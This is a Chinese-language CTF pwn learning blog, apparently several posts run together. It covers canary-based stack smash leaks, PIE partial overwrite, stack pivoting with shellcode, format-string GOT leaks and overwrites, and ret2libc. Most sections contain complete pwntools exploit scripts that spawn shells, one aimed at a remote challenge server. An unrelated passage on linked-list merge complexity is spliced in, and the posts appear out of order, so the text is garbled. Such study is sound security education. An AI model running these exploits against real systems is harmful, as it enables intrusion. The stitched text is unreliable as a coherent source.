Stack smash

原理

我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了

如图就是函数在开始时进行的设置“哨位”

这是在函数最后的检查

当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么

可以看到除了程序的输出外，还额外打印了一句

*** stack smashing detected ***: ./smashes.dms terminated

这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}

可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？

例题

知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下

保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。

那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了

在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。

我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了

from pwn import *
#p = process('./smashes.dms')
p = remote('pwn.jarvisoj.com', 9877)
flag_addr = 0x400d21
arg0_addr = 0x7fffffffdf48
name_addr = 0x7fffffffdd30
payload = (arg0_addr - name_addr)*'a' + p64(flag_addr)

p.recvuntil('name? ')
p.sendline(payload)
p.recvuntil('flag: ')
p.sendline('bb')
data = p.recv()
log.info(data)

要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了

栈上的 partial overwrite

原理

在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护

例题

原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie

保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了

那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小

拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候

思路齐全，上exp喽

#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#  context.log_level = "debug"


while True:
    try:
        io = process("./babypie.dms", timeout = 1)

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        io.interactive()
    except Exception as e:
        io.close()
        print e

Successful

pwn学习（6）花式栈溢出1

因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。

stack pivoting

原理说明

首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：

  • 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
  • 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
  • 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针

X-CTF Quals 2016 - b0verfl0w

原理看完了就拿题目来练练手吧。题目在ctf wiki的github上可以找到。老规矩先拿ida瞅一眼（保护机制检查不说了，这题啥也没有）

可以看到vul函数很明显有栈溢出漏洞，而且还意外发现有个hint的函数，不得不说出题人挺友好的

可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。

很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了

因为提示很明显了，让esp减掉了0x24，那我们可以想到，我们完全可以在栈上布置shellcode（没有开启DEP），填充完后让esp减掉某个值，再跳转到对应位置，那我们的shellcode不就被执行了吗。

说干就干，首先要找到能够让我们劫持栈指针的godget，拿ROPgadget查一下

可以看到有jmp esp这个指令，那我们就可以开始我们的exp构造工作了

from pwn import *
p = process('./b0verfl0w.dms')
jmp_esp = 0x08048504
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
sub_jmp = asm('sub esp,0x28;jmp esp')
payload = shellcode.ljust(0x20,'a') + 'aaaa' +p32(jmp_esp) + sub_jmp
#payload = shellcode + (0x20 - len(shellcode))*'a' + 'aaaa' + p32(jmp_esp) + sub_jmp
p.sendline(payload)
p.interactive()

为什么是-0x28呢？实际上是pad + ebp + retaddr算出来的，pad是0x20，四位的ebp，四位的retaddr，自然是0x28了，当然你也可以用别的，不过那就需要你自己改一下shellcode的布置了。

pwn学习（5）格式化字符串漏洞2

发表于 2018-11-20 | 分类于 pwn

昨天看了看格式化字符串漏洞的一些基本内容，今天一方面补全了一下知识，另一方面也做了个题目来练手。

覆盖任意地址

首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？

当然可以了，这就是我们内存覆盖的第二个方面—任意地址内存覆盖

覆盖小数字

我们分析程序认识到，我要想输出想要的结果，我们需要把a的值设置为2，b的值设置为0x12345678，那么问题就来了，我们上一次提到的%n是将“打印的个数”写入某个地址，一般的格式是

addr + %n$n

而addr作为一个地址长度已经是4了，难道说我们覆盖的最小值只能是4？那当然不是了，我们可以构造下面形式的payload：

aa%k$nxx + addr

是不是和刚才的有些不一样？这有什么玄机呢？其实很简单，我们之前构造payload时，是找到了我们输入的第一个四个字节所在的栈上的位置进而写入，那么我们也完全可以找到我们输入的第二个四个字节所在的位置（这个位置一想就知道了，就是我们之前找的那个偏移再+1）写入，以此类推。

上面的字符串其实首先拿aa作为填充字符，和%k凑了四个字节，然后拿$n和xx凑了四个字节，最后的是addr，那addr在栈上的位置也就是原来的偏移6 + 2 也就是8，所以我们的k就是8。万事具备，那我们就上脚本了：

p = process('./overwrite.dms')
a_addr = 0x804A024
payload = 'aa%8$naa' + p32(a_addr)
p.sendline(payload)
print p.recv()
p.interactive()

覆盖大数字

具体原理就不再博客上放了（我也没信心说明白，可以参考ctf wiki，毕竟咱们不能做脚本小子），给一个pwntools给出的函数来一步实现

payload = fmtstr_payload(offset, {addr:data})

这里的offset也就是咱们求出来的偏移值，addr是你想写入的地址，而data是你想写入的数据。
这样我们也可以很轻松的覆盖掉b的值，使程序执行到我们想要的地方，脚本如下

p = process('./overwrite.dms')
b_addr = 0x804A028
payload = fmtstr_payload(6, {b_addr:0x12345678})
p.sendline(payload)
#print p.recv()
p.interactive()

自动化寻找偏移值

Pwntools中同样给出了自动化寻找偏移值的方法，不过还是要在重复一遍，还是要搞明白之前讲的原理，毕竟咱们的目的不是做个脚本小子

def getoffset(payload):
    p = process("./overwrite.dms")
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info
autofmt = FmtStr(getoffset)
print autofmt.offset

题目实战1

题目是来自iscc2017的第一道pwn题，链接就不放了，很容易找到，还是老规矩，首先拿ida分析一波

可以看到在我们输入name后有一个很明显的格式化字符串漏洞。而在程序中没有可以供我们利用的/bin/sh字符串和system函数，那我们就要考虑人为的创造他们了。

/bin/sh字符串好说，因为程序存在输入，我们完全可以直接写进去，但system函数怎么办呢？前面说了利用这个漏洞我们可以实现任意地址的泄漏和写入，那我们可以首先泄漏某个函数的libc地址，然后计算出system的地址写入（因为got表表是可写的）之前的那个函数，这就相当于把之前的函数“变成”了system，拿选谁比较合适呢？当然是printf了，因为printf的参数恰好就是我们输入的字符，那我们把printf代替之后就可以直接执行system(“/bin/sh”)了

思路有了，上exp！

from pwn import *
#context.log_level = 'debug'

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF("./pwn1")
got_printf = elf.got['printf']
p = process("./pwn1")
p.recvuntil("input$")
p.sendline('1')
p.recvuntil('please input your name:\n')
payload = p32(got_printf) + "%6$s"
p.sendline(payload)
printf_addr_and_xxx = p.recvuntil(",you")
printf_addr = u32(printf_addr_and_xxx[4:8])
print "printf_addr = " + hex(printf_addr)
system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system'])
print "system_addr = " + hex(system_addr)

p.recvuntil("input$")
p.sendline('1')
p.recvuntil('please input your name:\n')

payload2 = fmtstr_payload(6, {got_printf: system_addr})
p.sendline(payload2)

p.sendline('1')
p.recvuntil('please input your name:\n')
p.sendline('/bin/sh\0')

p.interactive()

pwn学习（4）初识格式化字符串漏洞

发表于 2018-11-19 | 分类于 pwn

什么是格式化字符串？

这个问题我相信学过c语言的都不陌生，我们在使用printf一类（比如：sprintf、fprintf等）的函数时经常会用到这个东西，他的样子很好识别，一般就是%后面跟着一些字符，比如下面我们printf函数的第一个参数

#include<stdio.h>
int main()
{
    printf("this is a format string %s" , "yes");
    return 0;
}

它主要是用一个说明符（在上面的例子中是s）来告诉程序该以何种格式来输出，而后为我们在输出中按格式填充入我们在后面的内容

下面是几个常见的说明符

%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数

这里前几个都是用来打印的，最后一个却是一个“异类”，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n$n区别开来，这个的作用是“选择”，举个例子讲，%3$s，这个的意思就是将第三个我们的填充物以%s的格式打印出来。
因为这些说明符的种种特性，我们可以使用它们来干一些“坏事”

漏洞在哪？

如果我想让你写一段代码打印出我输入的字符串你会怎么办？我相信大多数人会写出下面的代码：

char str[100]
scanf("%s",str)
printf("%s",str)

代码看上去很简单嘛，但总有人喜欢偷懒，他会写成如下的形式：

printf(str)

这就出问题了，一般的函数，传入的参数都是固定的，但printf却不同，因为它要求有一个format string，这个format string就是它的身家性命，这东西就决定了它后面有多少的参数，而就算是你的format string后面没有足够的参数，他也会认为“你有足够的参数”，然后自动读取栈上的数据，按照你的format打印出来。那我们就可以玩点有趣的东西了，我们先给出个程序（程序代码来自ctf wiki）

#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}

可以看到这个程序就存在格式化字符串的漏洞。程序逻辑很简单，在我们输入s后，它先是“安全”的打印了s的内容，然后又直接打印了s，我们是这运行时输入这样一段数据

AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x

然后我们就非（li）常（suo）惊（ying）讶（dang）的发现程序给我们输出这些内容：

00000001.22222222.ffffffff.AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
AAAAffff5160,c2,f7e036bb,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825

很显然程序把原本不用该暴露给我们的东西都吐了出来，而输出的第四部分41414141大家也应该很清楚，就是我们的AAAA

泄漏任意内存地址

通过前几次的学习我们知道了got表可是个好东西，当时我们想法设法的泄漏出got表内容进而拿到libc里面所有我们想要的东西。而通过这个漏洞我们可以非常轻松的实现got表的泄漏

还是以上面的程序为例，程序中存在scanf函数，那我们就泄漏这个函数的got表地址。

首先先看一下我们上面的测试，刚才的测试可不是仅仅为了演示漏洞，我们还可以看见程序给我们的的输出中41414141和我们的输入“AAAA”实际上是一样的，而41414141也就是第五个打印的部分，那也就是说，前面的我们实际上都不需要，我们借助上面调皮的%n就可以完美实现打印这个东西了。

话不多说，上脚本

sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8])) 
sh.interactive()

覆盖内存

那有了泄漏任意地址的方式，那我们有没有利用这个来实现覆盖地址呢？其实是可以的，这里我们要用到关于%n的知识，其实上面说过了，但还是再列一遍

%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

这里应该分两部分，但今天有点事耽搁了，所以就先简单的看看第一部分，栈上的内存覆盖吧，程序如下（依旧来自ctf wiki）

/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {

  }
  return 0;
}

答案应为F，这里因为自己也曾经和有序表的合并搞混过，所以把两种一块拿过来仔细说说

  • 普通单链表合并，只需要遍历第一个单链表找到结尾，把第二个单链表直接接上就完事了，时间复杂度为o(n)
  • 有序合并并且合并后仍为有序，我们需要遍历两个链表，对data进行比较决定顺序，所以 时间复杂度应该为o(n+m)

附加题目—将N条长度均为M的有序链表进行合并，合并以后的链表也保持有序，时间复杂度为()?

这应该说是上一个题目的难度up版，答案为o(n*m*logN)，至于具体过程我们在下面仔细

  • 取每个链表的第一个元素，组成一个数组，然后对数组进行排序，这是我们的第一步的时间复杂度O(NlogN)
  • 将我们排序后数组的第一个节点视为新链表的第一个节点，将剩余链表的结点每次取一个用二叉搜索的方式插入数组，时间复杂度为O(logN)
  • 重复上一步，因为第一步我们已经去除了m个结点，所以重复的次数应当是N*M-1 次，最终的时间复杂度应该是O(NlogN) + (M - 1) \ N * O(logN)= M * N* O(logN)*

接着我们又找到了xor edx edx，这可以把edx置为0，而xor edx ebx在edx为0的时候就相当于把ebx的值给了edx啊，也就是说我们可以通过写入ebx，同时将edx置为0，然后二者xor使得edx变为我们写入的数据！这样我们就有了构造rop chain的基本思路！开写

Exp很简单，就一个地方需要特殊说明一下，为什么最后mov_bin_sh需要+p32(0)呢？这是因为我们执行的mov_ecx_edx的gadget在最后会先pop ebp、pop ebx，而之后将xor [ecx] bl，所以我们需要把ebx设为0，这样任何数xor0都等于它本身，这样也就是实现了我们的ecx不变的目的

另外这些题目也可以用泄漏got的方法拿到libc里的/bin/sh字符，这里就贴出exp，有兴趣的可以c试一试，要比组织rop chain简单不少

pwn学习（二）

发表于 2018-11-18 | 分类于 pwn

昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干

Ret2ilbc

首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。

下面就来看ctf wiki给出的三个例题吧，首先是第一个

很显然gets处存在栈溢出漏洞，紧接着我们来看看程序给我们“提供”了什么可以利用的点

可以看到程序非常大方的给了我们/bin/sh的字符串和system函数，那任务就结束了，我们只需要溢出s将函数的返回地址设置为system的地址，紧接着将system的参数设置为字符串的地址即可，直接上脚本了

from pwn import *
p = process('./ret2libc1.dms')
system = 0x8048460
bin = 0x08048720
payload = flat(['a'*112,system,'b'*4],bin)
p.sendline(payload)
p.interactive()

注意，我们的system作为我们将要返回的函数，他自然也有要返回的函数，因为我们只需要拿到sh，所以他具体返回什么我们就不用操心了，所以直接拿4个b把他的返回地址给填充掉就好了。当然，这是我们手动找到了system函数的地址，是不是还有其他的办法呢？当然有了，脚本一改

from pwn import *
p = process('./ret2libc1.dms')
elf = ELF('./ret2libc1.dms')
system_addr = elf.plt['system']
bin_addr = 0x8048720
payload = 112*'a' + p32(system_addr) +'b'*4 + p32(bin_addr)
p.sendline(payload)
p.interactive()

这里我们使用了ELF加载了我们的程序，而ELF的plt中就是保存着我们的地址与函数的一一映射，因此我们用plt[‘system’]就可以拿到system的地址了

紧接着看第二个题目

溢出点还是gets函数，但这次就没有第一次那么简单了，虽然还有system函数，但是没有可以供我们使用的/bin/sh字符串了，这时候我们就要开动脑筋想一想了，毛爷爷说过，没有条件创造条件，他没给字符串，我们可不可以自己输入一个进去呢？我们抓紧来看一下

首先就是天时啊，程序有个gets的函数，那我们何不借东风？拿它来一招瞒天过海？

其次地利也有啊，bss段又个0x64长度的buf2数组没被用过，刚好我们瞒天过海而来的字符串就由它再暗度陈仓了。天时地利，就差exp了

from pwn import *
p = process('./ret2libc2.dms')
elf = ELF('./ret2libc2.dms')
gets_addr = elf.plt['gets']
system_addr = elf.plt['system']
pop_ebx = 0x0804843d
buf2 = 0x804A080
payload = 112*'a' + p32(gets_addr) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + 4*'a' + p32(buf2)
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()

这里简单提一句为什么会有个pop ebx，主要是gets函数其实是改变了堆栈状态的，我们这里使用了pop主要是为了平衡堆栈的，你pop谁都可以，add也行。

趁热打铁把第三题也做了，这个题比起上面的两个题难度系数高了很多，这次是既没有了system函数也没有了/bin/sh，那就比较麻烦了，我们要找的东西可就多了。不过有个好消息就是我们的system函数是属于libc，而libc.so里函数的相对偏移是一定的，更让人高兴的是即使程序ASLR的保护，也只是针对地址的中间位进行随机，最低的12位并不会发生改变，而这些github上都有人把工作给我们做好了，我们只需要知道一个函数在libc的地址，就可以顺藤摸瓜搞到所有函数（甚至还有字符串/bin/sh）的地址，这样就人工创造了天时地利，只差我们的exp了

from pwn import *
from LibcSearcher import LibcSearcher
p = process('./ret2libc3.dms')
e = ELF('./ret2libc3.dms')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']
p.recv()
p.sendline(flat(['A' * 0x70, puts_plt, main, puts_got]))
puts_addr = u32(p.recv()[0:4])
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
p.sendline(flat(['A' * 104, system_addr, 'b'*4, binsh_addr]))
p.interactive()

这里用到了新的工具—LibcSearcher，这个工具主要是能够帮助我们轻松的利用已有的got表的泄漏快速找到我们想要的东西，用法也很简单LibcSeacher(‘函数名’,地址)得到了libc，之后libc.dump()就可以得到偏移了，之后按照之前的方法构造payload就好了。要注意这里我们的pad要-8，因为我们是在main函数里又调用了main函数。

ret2text

原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的设置返回地址，而我们可以利用程序中的一些“无限制”的读取函数来覆盖掉返回地址，而当我们设置好了合适的大小时，我们就可以将eip随意设置成我们想要执行的函数的地址，而如果这个函数恰恰程序又给我们提供了的话，就实现了ret2text，简单说就是控制程序执行他本身原有的代码。当然，我们进行控制的时候也可以利用“零碎”的代码组成我们想要的，这是后话了。

例子我们就使用ctf wiki上提供的ret2text，因为是我们的第一个pwn题目，所以我们来仔细进行一下每一步的总结。

首先我们可以用peda自带的checksec函数来检查程序的保护机制（由于保护机制我后期想深入进行研究所以这里就不再赘述了，之后弄个详细的总结）
